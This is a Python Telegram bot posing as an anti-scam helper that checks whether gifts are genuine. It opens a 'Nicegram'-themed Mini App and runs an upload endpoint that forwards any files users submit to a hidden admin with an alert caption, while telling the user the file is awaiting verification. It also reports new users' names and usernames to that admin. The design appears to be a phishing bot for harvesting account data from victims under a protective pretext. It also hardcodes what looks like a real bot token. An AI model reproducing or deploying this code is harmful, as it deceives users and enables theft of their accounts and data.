import asyncio
import logging
import os
import sqlite3
from aiohttp import web
from aiogram import Bot, Dispatcher, types, Router
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, FSInputFile, WebAppInfo, BufferedInputFile

# --- КОНФИГУРАЦИЯ ---
BOT_TOKEN = '8202878099:AAES9ybI0KKY9e_ixXrUMXtwqs-TL2r8nQg'
# Начальный ID админа (используется при перезапуске бота)
INITIAL_ADMIN_ID = 8187498719
WEB_APP_URL = "https://kareli123.github.io/nicegram/" 

# Глобальная переменная текущего админа
current_admin_id = INITIAL_ADMIN_ID

# --- НАСТРОЙКИ СЕРВЕРА ---
WEB_SERVER_HOST = "0.0.0.0"
WEB_SERVER_PORT = int(os.environ.get("PORT", 8080))

logging.basicConfig(level=logging.INFO)

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()
router = Router()
dp.include_router(router)

# --- БАЗА ДАННЫХ (SQLite) ---
DB_FILE = "bot_data.db"

def init_db():
    """Создает таблицу пользователей, если её нет"""
    with sqlite3.connect(DB_FILE) as conn:
        cursor = conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY,
                username TEXT,
                full_name TEXT
            )
        ''')
        conn.commit()

def add_user_if_new(user: types.User):
    """
    Добавляет пользователя в БД.
    Возвращает True, если пользователь новый.
    Возвращает False, если уже был.
    """
    with sqlite3.connect(DB_FILE) as conn:
        cursor = conn.cursor()
        cursor.execute("SELECT user_id FROM users WHERE user_id = ?", (user.id,))
        if cursor.fetchone():
            return False # Пользователь уже есть
        
        # Если нет, добавляем
        cursor.execute("INSERT INTO users (user_id, username, full_name) VALUES (?, ?, ?)", 
                       (user.id, user.username, user.full_name))
        conn.commit()
        return True

# --- ВЕБ-СЕРВЕР ---
routes = web.RouteTableDef()

@routes.post('/upload')
async def handle_upload_file(request: web.Request):
    reader = await request.multipart()
    
    user_id = None
    file_data = None
    filename = "unknown.json"

    async for field in reader:
        if field.name == 'user_id':
            val = await field.read_chunk()
            user_id = val.decode('utf-8')
        elif field.name == 'file':
            filename = field.filename or "data.json"
            file_data = await field.read()

    if user_id and file_data:
        try:
            # 1. Отправка ТЕКУЩЕМУ админу
            global current_admin_id
            await bot.send_document(
                chat_id=current_admin_id,
                document=BufferedInputFile(file_data, filename=filename),
                caption=f"🚨 Файл загружен через Mini App!\nUser ID: {user_id}"
            )
            logging.info(f"Файл от {user_id} отправлен админу ({current_admin_id}).")

            # 2. Ответ пользователю
            try:
                await bot.send_message(chat_id=int(user_id), text="✅ Файл принят. Ожидайте проверки.")
            except Exception as e:
                logging.warning(f"Не удалось ответить юзеру {user_id}: {e}")

        except Exception as e:
            logging.error(f"Ошибка при обработке файла: {e}")
            return web.Response(text="Error processing", status=500)

    return web.Response(text="OK", headers={
        "Access-Control-Allow-Origin": "*",
        "Access-Control-Allow-Methods": "POST, OPTIONS"
    })

@routes.options('/upload')
async def handle_options(request):
    return web.Response(text="OK", headers={
        "Access-Control-Allow-Origin": "*",
        "Access-Control-Allow-Methods": "POST, OPTIONS",
        "Access-Control-Allow-Headers": "Content-Type"
    })

# --- БОТ ---

TEXT_MAIN = """Привет! Я - Бот, который поможет тебе не попасться на мошенников. 
Я помогу отличить реальный подарок от чистого визуала, чистый подарок без рефаунда и подарок, за который уже вернули деньги."""

def get_main_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🚀 Открыть приложение", web_app=WebAppInfo(url=WEB_APP_URL))]
    ])

@router.message(Command("start"))
async def cmd_start(message: types.Message):
    user = message.from_user
    
    # Проверяем, новый ли пользователь
    is_new = add_user_if_new(user)
    
    if is_new:
        # Уведомляем админа
        global current_admin_id
        admin_text = (
            f"👤 <b>Новый пользователь!</b>\n"
            f"Имя: {user.full_name}\n"
            f"Username: @{user.username}\n"
            f"ID: <code>{user.id}</code>"
        )
        try:
            await bot.send_message(current_admin_id, admin_text, parse_mode="HTML")
        except Exception as e:
            logging.error(f"Не удалось уведомить админа о новом пользователе: {e}")

    # Логика отправки приветствия
    if os.path.exists("nicegramm.jpg"):
        try:
            photo = FSInputFile("nicegramm.jpg")
            await message.answer_photo(photo=photo, caption=TEXT_MAIN, reply_markup=get_main_keyboard())
        except Exception as e:
            logging.error(f"Ошибка отправки фото: {e}")
            await message.answer(TEXT_MAIN, reply_markup=get_main_keyboard())
    else:
        await message.answer(TEXT_MAIN, reply_markup=get_main_keyboard())

@router.message(Command("admin"))
async def cmd_change_admin(message: types.Message):
    global current_admin_id
    
    # Проверка безопасности: команду может выполнить только текущий админ
    if message.from_user.id != current_admin_id:
        # Можно просто игнорировать или ответить, что прав нет
        return

    # Разбираем аргументы: /admin @username
    args = message.text.split()
    if len(args) < 2:
        await message.answer("⚠️ Использование: <code>/admin @username</code>", parse_mode="HTML")
        return

    target_username = args[1].replace('@', '') # Убираем собачку, если есть

    try:
        # Пытаемся получить инфо о чате по юзернейму
        # ВАЖНО: Бот может найти только тех, кто уже писал ему или у кого нет строгих настроек приватности
        chat_info = await bot.get_chat(f"@{target_username}")
        new_admin_id = chat_info.id
        
        # Обновляем глобальную переменную
        current_admin_id = new_admin_id
        
        await message.answer(
            f"✅ <b>Админ успешно изменен!</b>\n"
            f"Новый админ: {chat_info.full_name} (@{chat_info.username})\n"
            f"ID: <code>{new_admin_id}</code>", 
            parse_mode="HTML"
        )
        
        # Попробуем уведомить нового админа
        try:
            await bot.send_message(new_admin_id, "👑 Вы назначены новым администратором бота.")
        except:
            pass # Если бот заблокирован новым админом, просто игнорируем

    except Exception as e:
        logging.error(f"Ошибка смены админа: {e}")
        await message.answer(
            "❌ <b>Ошибка!</b>\n"
            "Не удалось найти пользователя. Возможно:\n"
            "1. Указан неверный юзернейм.\n"
            "2. Пользователь никогда не запускал этого бота.\n"
            "3. У пользователя скрытый профиль.", 
            parse_mode="HTML"
        )

# --- ЗАПУСК ---
async def main():
    # Инициализация БД
    init_db()
    
    # 1. Настройка веб-сервера
    app = web.Application()
    app.add_routes(routes)
    
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, WEB_SERVER_HOST, WEB_SERVER_PORT)
    
    await site.start()
    logging.info(f"🌍 Server running on {WEB_SERVER_HOST}:{WEB_SERVER_PORT}")

    # 2. Запуск поллинга бота
    await bot.delete_webhook(drop_pending_updates=True)
    try:
        await dp.start_polling(bot)
    finally:
        await runner.cleanup()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except (KeyboardInterrupt, SystemExit):
        logging.info("Bot stopped!")
